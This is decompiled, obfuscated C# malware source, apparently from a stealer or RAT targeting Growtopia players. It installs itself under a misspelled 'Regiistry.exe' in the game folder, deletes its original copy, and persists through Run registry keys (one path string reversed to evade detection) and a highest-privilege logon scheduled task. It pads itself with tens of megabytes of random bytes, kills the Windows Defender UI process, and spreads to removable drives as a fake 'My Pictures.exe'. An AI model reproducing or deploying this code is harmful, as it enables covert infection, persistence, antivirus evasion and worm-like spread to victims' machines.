using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.Win32;

internal class Class43
{
	[Serializable]
	[CompilerGenerated]
	private sealed class Class44
	{
		public static readonly Class44 class44_0 = new Class44();

		public static Action action_0;

		internal void method_0()
		{
			smethod_0();
		}
	}

	private static void smethod_0()
	{
		try
		{
			try
			{
				string installPath = GClass69.InstallPath;
				string text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\game\\pets\\Regiistry.exe";
				if (installPath != text)
				{
					if (File.Exists(text))
					{
						File.Delete(text);
						Directory.CreateDirectory(text);
					}
					else
					{
						Directory.CreateDirectory(text);
					}
					File.Copy(installPath, text);
					Process process = new Process();
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.StartInfo.WorkingDirectory = Path.GetDirectoryName(text);
					process.StartInfo.FileName = "cmd.exe";
					process.StartInfo.Arguments = "/c Regiistry.exe";
					process.Start();
					Process.Start(new ProcessStartInfo
					{
						Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.get_ExecutablePath(),
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						FileName = "cmd.exe"
					});
					Application.Exit();
				}
				if (!(installPath == text))
				{
					return;
				}
				try
				{
					string text2 = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule!.FileName) + "\\boop";
					string[] files = Directory.GetFiles(text2);
					try
					{
						File.SetAttributes(Assembly.GetEntryAssembly()!.Location, File.GetAttributes(Assembly.GetEntryAssembly()!.Location) | FileAttributes.Hidden | FileAttributes.System);
					}
					catch
					{
					}
					try
					{
						Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Process.GetCurrentProcess().MainModule!.FileName, Application.get_ExecutablePath());
					}
					catch
					{
					}
					while (true)
					{
						if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(files[0])).Length == 0)
						{
							Process process2 = new Process();
							process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
							process2.StartInfo.WorkingDirectory = text2;
							process2.StartInfo.FileName = "cmd.exe";
							process2.StartInfo.Arguments = "/c " + Path.GetFileName(files[0]);
							process2.Start();
							Thread.Sleep(5000);
						}
						Thread.Sleep(5000);
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	public static void smethod_1()
	{
		try
		{
			FileInfo fileInfo = new FileInfo(GClass69.InstallPath);
			if (!(Process.GetCurrentProcess().MainModule!.FileName != fileInfo.FullName))
			{
				return;
			}
			for (int i = 0; i < 10; i++)
			{
				Thread.Sleep(1000);
			}
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.MainModule!.FileName == fileInfo.FullName)
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			if (GClass38.smethod_1())
			{
				Task.Run((Action)GClass52.smethod_27).Wait();
				Process process2 = new Process();
				process2.StartInfo = new ProcessStartInfo
				{
					FileName = "schtasks.exe",
					Arguments = "/create /f /sc ONLOGON /RL HIGHEST /tn \"'" + Path.GetFileNameWithoutExtension(fileInfo.FullName) + "\"' /tr \"'" + fileInfo.FullName + "\"'",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				};
				process2.Start();
			}
			else
			{
				using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Strings.StrReverse("\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.FullName), "\"" + fileInfo.FullName + "\"");
			}
			if (File.Exists(fileInfo.FullName))
			{
				File.Delete(fileInfo.FullName);
				Thread.Sleep(1000);
			}
			FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
			byte[] array = File.ReadAllBytes(Process.GetCurrentProcess().MainModule!.FileName);
			fileStream.Write(array, 0, array.Length);
			byte[] array2 = new byte[new Random().Next(40960000, 51200000)];
			new Random().NextBytes(array2);
			fileStream.Write(array2, 0, array2.Length);
			fileStream.Dispose();
			GClass47.smethod_3(GClass69.InstallPath);
			string text = Path.GetTempFileName() + ".bat";
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("@echo off");
				streamWriter.WriteLine("timeout 3 > NUL");
				streamWriter.WriteLine("START \"\" \"" + fileInfo.FullName + "\"");
				streamWriter.WriteLine("CD " + Path.GetTempPath());
				streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
			}
			Process.Start(new ProcessStartInfo
			{
				FileName = text,
				CreateNoWindow = true,
				ErrorDialog = false,
				UseShellExecute = false,
				WindowStyle = ProcessWindowStyle.Hidden
			});
			Class45.smethod_0();
			Task.Run(delegate
			{
				smethod_0();
			}).Wait();
			if (GClass5.bool_8)
			{
				processes = Process.GetProcessesByName("MSASCui");
				for (int j = 0; j < processes.Length; j++)
				{
					processes[j].Kill();
				}
				GClass52.smethod_72();
			}
			if (GClass5.bool_3 && !GClass39.smethod_1())
			{
				GClass69.AddStartUpFailed = true;
			}
			if (GClass5.bool_4)
			{
				try
				{
					File.SetAttributes(GClass69.InstallPath, FileAttributes.Hidden);
				}
				catch (Exception)
				{
				}
			}
			if (GClass5.bool_2)
			{
				try
				{
					_ = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\MRT.exe";
					Assembly.GetExecutingAssembly();
					string sourceFileName = Environment.GetCommandLineArgs()[0];
					while (true)
					{
						Thread.Sleep(2522);
						DriveInfo driveInfo = new DriveInfo("C:\\");
						if (driveInfo.IsReady && driveInfo.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "C:\\My Pictures.exe");
								if (File.Exists("C:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("C:\\My Pictures");
										File.SetAttributes("C:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo2 = new DriveInfo("D:\\");
						if (driveInfo2.IsReady && driveInfo2.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "D:\\My Pictures.exe");
								if (File.Exists("D:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("D:\\My Pictures");
										File.SetAttributes("D:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo3 = new DriveInfo("E:\\");
						if (driveInfo3.IsReady && driveInfo3.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "E:\\My Pictures.exe");
								if (File.Exists("E:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("E:\\My Pictures");
										File.SetAttributes("E:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo4 = new DriveInfo("F:\\");
						if (driveInfo4.IsReady && driveInfo4.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "F:\\My Pictures.exe");
								if (File.Exists("F:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("F:\\My Pictures");
										File.SetAttributes("F:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo5 = new DriveInfo("G:\\");
						if (driveInfo5.IsReady && driveInfo5.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "G:\\My Pictures.exe");
								if (File.Exists("G:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("G:\\My Pictures");
										File.SetAttributes("G:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo6 = new DriveInfo("H:\\");
						if (driveInfo6.IsReady && driveInfo6.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "H:\\My Pictures.exe");
								if (File.Exists("H:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("H:\\My Pictures");
										File.SetAttributes("H:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo7 = new DriveInfo("I:\\");
						if (!driveInfo7.IsReady || driveInfo7.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "I:\\My Pictures.exe");
								if (File.Exists("I:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("I:\\My Pictures");
										File.SetAttributes("I:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo8 = new DriveInfo("J:\\");
						if (driveInfo8.IsReady && driveInfo8.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "J:\\My Pictures.exe");
								if (File.Exists("J:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("J:\\My Pictures");
										File.SetAttributes("J:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo9 = new DriveInfo("K:\\");
						if (driveInfo9.IsReady && driveInfo9.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "K:\\My Pictures.exe");
								if (File.Exists("K:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("K:\\My Pictures");
										File.SetAttributes("K:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo10 = new DriveInfo("L:\\");
						if (driveInfo10.IsReady && driveInfo10.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "L:\\My Pictures.exe");
								if (File.Exists("L:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("L:\\My Pictures");
										File.SetAttributes("L:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo11 = new DriveInfo("M:\\");
						if (!driveInfo11.IsReady)
						{
							break;
						}
						if (driveInfo11.DriveType == DriveType.Fixed)
						{
							continue;
						}
						try
						{
							File.Copy(sourceFileName, "M:\\My Pictures.exe");
							if (File.Exists("M:\\My Pictures.exe"))
							{
								try
								{
									Directory.CreateDirectory("M:\\My Pictures");
									File.SetAttributes("M:\\My Pictures", FileAttributes.Hidden);
								}
								catch
								{
								}
							}
						}
						catch
						{
						}
						break;
					}
				}
				catch
				{
				}
			}
			Environment.Exit(0);
		}
		catch (Exception)
		{
		}
	}
}
